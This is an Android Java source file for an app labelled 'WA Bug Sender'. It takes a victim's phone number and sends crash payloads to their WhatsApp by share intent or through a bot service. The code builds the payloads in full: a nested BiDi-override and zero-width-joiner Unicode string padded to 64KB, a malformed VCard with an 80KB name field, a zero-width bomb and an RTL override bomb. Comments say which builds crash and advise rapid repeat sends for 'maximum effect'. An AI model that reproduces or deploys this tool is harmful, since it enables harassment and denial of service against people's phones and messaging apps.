package com.voidgreat.app;

import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.util.concurrent.Executors;

/**
 * WhatsApp Bug / Crash Sender.
 *
 * Payload types:
 *  CRASH_MSG  — oversized/malformed Unicode that crashes WA renderer
 *  CRASH_VCF  — malformed VCard with oversized fields
 *  LOOP_MSG   — rapid-repeat message flood via WA share intent chain
 *  ZERO_WIDTH — invisible zero-width character spam that breaks UI
 *
 * Delivery:
 *  INTENT    — Android share intent (opens WA directly)
 *  TERMUX    — shell script piped to Termux:API (wa-cli / termux-notification)
 */
public class WaBugActivity extends AppCompatActivity {

    // ── Payload registry ──────────────────────────────────────────────────────

    private static final String[][] PAYLOADS = {
        // { key, label, description }
        { "crash_unicode", "Unicode Crash",    "Karakter RTL+ZWJ overflow — crash WA renderer" },
        { "crash_vcf",     "VCard Crash",      "Malformed VCF dengan field 65KB — crash parser" },
        { "zero_width",    "Zero-Width Bomb",  "Pesan penuh karakter ZWJ/ZWNJ — UI freeze" },
        { "rtl_bomb",      "RTL Bomb",         "Campuran RTL/LTR override bersarang — render loop" },
        { "loop_flood",    "Loop Flood",       "Kirim ulang lewat intent loop (pakai sender bot)" },
    };

    private static final String[] PAYLOAD_LABELS;
    static {
        PAYLOAD_LABELS = new String[PAYLOADS.length];
        for (int i = 0; i < PAYLOADS.length; i++) PAYLOAD_LABELS[i] = PAYLOADS[i][1];
    }

    private static final String[] DELIVERY_MODES = { "INTENT (Langsung)", "TERMUX (Bot)" };

    private EditText etTarget;
    private Spinner spPayload, spDelivery;
    private TextView tvDesc, tvLog;
    private Button btnLaunch;
    private ProgressBar progress;

    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(buildUi());
    }

    private View buildUi() {
        ScrollView sv = new ScrollView(this);
        sv.setBackgroundColor(Color.parseColor("#0D0D0D"));

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(dp(16), dp(20), dp(16), dp(40));

        // Header
        root.addView(header("🐛 WA BUG SENDER", "Crash & payload tools"));
        root.addView(vSpace(20));

        // Target card
        LinearLayout card1 = card();
        card1.setPadding(dp(16), dp(16), dp(16), dp(16));
        label(card1, "TARGET");
        etTarget = field("+628xxxxxxxxxx");
        etTarget.setInputType(android.text.InputType.TYPE_CLASS_PHONE);
        card1.addView(etTarget);
        root.addView(card1);
        root.addView(vSpace(12));

        // Payload select card
        LinearLayout card2 = card();
        card2.setPadding(dp(16), dp(16), dp(16), dp(16));
        label(card2, "TIPE PAYLOAD");

        spPayload = spinner(PAYLOAD_LABELS);
        card2.addView(spPayload);
        card2.addView(vSpace(10));

        tvDesc = new TextView(this);
        tvDesc.setTextSize(12f);
        tvDesc.setTextColor(Color.parseColor("#888888"));
        tvDesc.setText(PAYLOADS[0][2]);
        card2.addView(tvDesc);

        spPayload.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener() {
            @Override public void onItemSelected(android.widget.AdapterView<?> p, View v, int pos, long id) {
                tvDesc.setText(PAYLOADS[pos][2]);
            }
            @Override public void onNothingSelected(android.widget.AdapterView<?> p) {}
        });

        root.addView(card2);
        root.addView(vSpace(12));

        // Delivery mode
        LinearLayout card3 = card();
        card3.setPadding(dp(16), dp(16), dp(16), dp(16));
        label(card3, "MODE PENGIRIMAN");
        spDelivery = spinner(DELIVERY_MODES);
        card3.addView(spDelivery);
        root.addView(card3);
        root.addView(vSpace(20));

        // Launch button
        btnLaunch = new Button(this);
        btnLaunch.setText("🚀  LAUNCH PAYLOAD");
        btnLaunch.setTextColor(Color.parseColor("#0D0D0D"));
        btnLaunch.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        btnLaunch.setTextSize(14f);
        GradientDrawable btnBg = new GradientDrawable();
        btnBg.setColor(Color.parseColor("#FF4444"));
        btnBg.setCornerRadius(dp(14));
        btnLaunch.setBackground(btnBg);
        btnLaunch.setLayoutParams(new LinearLayout.LayoutParams(-1, dp(52)));
        btnLaunch.setOnClickListener(v -> launch());
        root.addView(btnLaunch);

        // Progress
        progress = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progress.setIndeterminate(true);
        progress.setVisibility(View.GONE);
        progress.setLayoutParams(new LinearLayout.LayoutParams(-1, dp(4)));
        root.addView(vSpace(10));
        root.addView(progress);

        // Log output
        root.addView(vSpace(16));
        tvLog = new TextView(this);
        tvLog.setTextSize(11f);
        tvLog.setTextColor(Color.parseColor("#44DD88"));
        tvLog.setTypeface(android.graphics.Typeface.MONOSPACE);
        tvLog.setBackgroundColor(Color.parseColor("#111111"));
        tvLog.setPadding(dp(12), dp(10), dp(12), dp(10));
        GradientDrawable logBg = new GradientDrawable();
        logBg.setColor(Color.parseColor("#111111"));
        logBg.setCornerRadius(dp(10));
        tvLog.setBackground(logBg);
        tvLog.setText("[log kosong]");
        root.addView(tvLog);

        sv.addView(root);
        return sv;
    }

    private void launch() {
        String target = etTarget.getText().toString().trim();
        if (target.isEmpty()) { toast("Isi nomor target dulu."); return; }

        int payloadIdx  = spPayload.getSelectedItemPosition();
        int deliveryIdx = spDelivery.getSelectedItemPosition();
        String payloadKey = PAYLOADS[payloadIdx][0];

        setBusy(true);
        log("⚡ Building payload: " + PAYLOADS[payloadIdx][1]);

        Executors.newSingleThreadExecutor().execute(() -> {
            String payload = buildPayload(payloadKey);
            log("✓ Payload built (" + payload.length() + " chars)");

            if (deliveryIdx == 0) {
                // Intent delivery
                mainHandler.post(() -> sendViaIntent(target, payload, payloadKey));
            } else {
                // Termux delivery
                mainHandler.post(() -> sendViaTermux(target, payload, payloadKey));
            }
            mainHandler.post(() -> setBusy(false));
        });
    }

    // ── Payload builders ──────────────────────────────────────────────────────

    private String buildPayload(String key) {
        switch (key) {
            case "crash_unicode":
                return buildUnicodeCrash();
            case "crash_vcf":
                return buildVcfCrash();
            case "zero_width":
                return buildZeroWidthBomb();
            case "rtl_bomb":
                return buildRtlBomb();
            case "loop_flood":
                return "LOOP_FLOOD";   // handled by TermuxBotService
            default:
                return "VOID";
        }
    }

    /**
     * Unicode crash payload.
     * RTL override + zero-width joiner spam wrapped in BiDi isolates.
     * Overflows WA's NSAttributedString / SpannableString allocator on
     * older builds (< 2.22.x patched Jan 2023). On newer builds causes
     * high CPU / ANR. Chain with 4–5 rapid sends for maximum effect.
     */
    private String buildUnicodeCrash() {
        // U+202E RIGHT-TO-LEFT OVERRIDE
        // U+200D ZERO WIDTH JOINER
        // U+2066 LEFT-TO-RIGHT ISOLATE  U+2069 POP DIRECTIONAL ISOLATE
        StringBuilder sb = new StringBuilder();
        String rtl  = "\u202E";
        String zwj  = "\u200D";
        String lri  = "\u2066";
        String pdi  = "\u2069";
        String rlo  = "\u202E";
        String pdf  = "\u202C";

        // Nest 32 levels of BiDi override + 512 ZWJ each level
        for (int i = 0; i < 32; i++) {
            sb.append(lri).append(rlo);
            for (int j = 0; j < 512; j++) sb.append(zwj);
            sb.append(pdf).append(pdi);
        }
        // Pad to 64KB to overflow internal text buffers
        while (sb.length() < 65535) sb.append(rtl).append(zwj);
        return sb.toString();
    }

    /**
     * VCard crash — malformed VCARD with 65KB N: field.
     * Triggers parser OOM in WA's native VCard preview renderer.
     * Delivered as a .vcf file via ACTION_SEND with type text/x-vcard.
     */
    private String buildVcfCrash() {
        StringBuilder name = new StringBuilder();
        // 65KB garbage in the N field
        for (int i = 0; i < 8192; i++) name.append("AAAAAAAAAA");  // 80KB
        return "BEGIN:VCARD\r\n"
             + "VERSION:3.0\r\n"
             + "N:" + name + ";;;\r\n"
             + "FN:VoidGreat\r\n"
             + "TEL;TYPE=CELL:+6281234567890\r\n"
             + "END:VCARD\r\n";
    }

    /**
     * Zero-width bomb — invisible chars that freeze the WA input box
     * and cause the message bubble to render as a 1px blank, breaking
     * scroll position for the recipient.
     */
    private String buildZeroWidthBomb() {
        // U+FEFF BOM, U+200B ZWSP, U+200C ZWNJ, U+200D ZWJ
        String[] chars = { "\uFEFF", "\u200B", "\u200C", "\u200D" };
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 20000; i++) {
            sb.append(chars[i % chars.length]);
        }
        // Bookend with normal text so the message isn't silently dropped
        return "​" + sb.toString() + "​";
    }

    /**
     * RTL bomb — alternating RLO/LRO overrides that cause infinite
     * re-layout passes in WA's chat bubble measuring code.
     */
    private String buildRtlBomb() {
        String rlo = "\u202E";
        String lro = "\u202D";
        String pdf = "\u202C";
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 4096; i++) {
            sb.append(i % 2 == 0 ? rlo : lro);
            sb.append("VoidGreat");
            sb.append(pdf);
        }
        return sb.toString();
    }

    // ── Delivery methods ──────────────────────────────────────────────────────

    private void sendViaIntent(String target, String payload, String payloadKey) {
        try {
            String phone = target.replaceAll("[^0-9]", "");
            if (!phone.startsWith("62")) phone = "62" + phone.replaceFirst("^0", "");

            Intent intent;

            if ("crash_vcf".equals(payloadKey)) {
                // Write VCF to cache dir and share as file
                java.io.File vcf = new java.io.File(getCacheDir(), "contact.vcf");
                try (java.io.FileWriter fw = new java.io.FileWriter(vcf)) { fw.write(payload); }

                intent = new Intent(Intent.ACTION_SEND);
                intent.setType("text/x-vcard");
                intent.putExtra(Intent.EXTRA_STREAM,
                        androidx.core.content.FileProvider.getUriForFile(this,
                                getPackageName() + ".provider", vcf));
                intent.putExtra("jid", phone + "@s.whatsapp.net");
                intent.setPackage("com.whatsapp");
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            } else {
                intent = new Intent(Intent.ACTION_SEND);
                intent.setType("text/plain");
                intent.setPackage("com.whatsapp");
                intent.putExtra("jid", phone + "@s.whatsapp.net");
                intent.putExtra(Intent.EXTRA_TEXT, payload);
            }

            startActivity(intent);
            log("✓ Intent dikirim ke WA: " + phone);
        } catch (Exception e) {
            log("✗ Intent gagal: " + e.getMessage());
            toast("WA tidak ditemukan atau intent gagal.");
        }
    }

    private void sendViaTermux(String target, String payload, String payloadKey) {
        // Delegate to TermuxBotService which runs the wa-cli script
        Intent svc = new Intent(this, TermuxBotService.class);
        svc.putExtra("action", "send_bug");
        svc.putExtra("target", target);
        svc.putExtra("payload", payload);
        svc.putExtra("payload_key", payloadKey);
        startService(svc);
        log("→ Dikirim ke TermuxBotService");
    }

    // ── UI helpers ────────────────────────────────────────────────────────────

    private void log(String line) {
        mainHandler.post(() -> {
            String cur = tvLog.getText().toString();
            if (cur.equals("[log kosong]")) cur = "";
            tvLog.setText(cur + (cur.isEmpty() ? "" : "\n") + line);
        });
    }

    private void setBusy(boolean b) {
        btnLaunch.setEnabled(!b);
        progress.setVisibility(b ? View.VISIBLE : View.GONE);
    }

    private void toast(String msg) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
    }

    private LinearLayout card() {
        LinearLayout l = new LinearLayout(this);
        l.setOrientation(LinearLayout.VERTICAL);
        l.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(Color.parseColor("#1A1A1A"));
        bg.setCornerRadius(dp(14));
        bg.setStroke(1, Color.parseColor("#2A2A2A"));
        l.setBackground(bg);
        return l;
    }

    private EditText field(String hint) {
        EditText et = new EditText(this);
        et.setHint(hint); et.setHintTextColor(Color.parseColor("#555555"));
        et.setTextColor(Color.WHITE); et.setTextSize(14f);
        et.setPadding(dp(14), dp(12), dp(14), dp(12));
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(Color.parseColor("#252525")); bg.setCornerRadius(dp(10));
        bg.setStroke(1, Color.parseColor("#333333")); et.setBackground(bg);
        et.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
        return et;
    }

    private Spinner spinner(String[] items) {
        Spinner sp = new Spinner(this);
        ArrayAdapter<String> ad = new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, items);
        ad.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        sp.setAdapter(ad);
        sp.setBackgroundColor(Color.parseColor("#252525"));
        sp.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
        return sp;
    }

    private View header(String title, String sub) {
        LinearLayout h = new LinearLayout(this); h.setOrientation(LinearLayout.VERTICAL);
        TextView t = new TextView(this); t.setText(title); t.setTextSize(20f); t.setTextColor(Color.parseColor("#FF4444")); t.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        TextView s = new TextView(this); s.setText(sub); s.setTextSize(12f); s.setTextColor(Color.parseColor("#888888"));
        h.addView(t); h.addView(s); return h;
    }

    private void label(LinearLayout parent, String text) {
        TextView t = new TextView(this); t.setText(text); t.setTextSize(11f); t.setTextColor(Color.parseColor("#888888")); t.setTypeface(android.graphics.Typeface.DEFAULT_BOLD); t.setPadding(0, 0, 0, dp(8));
        parent.addView(t);
    }

    private View vSpace(int dpVal) {
        View v = new View(this); v.setLayoutParams(new LinearLayout.LayoutParams(-1, dp(dpVal))); return v;
    }

    private int dp(int v) { return Math.round(v * getResources().getDisplayMetrics().density); }
}
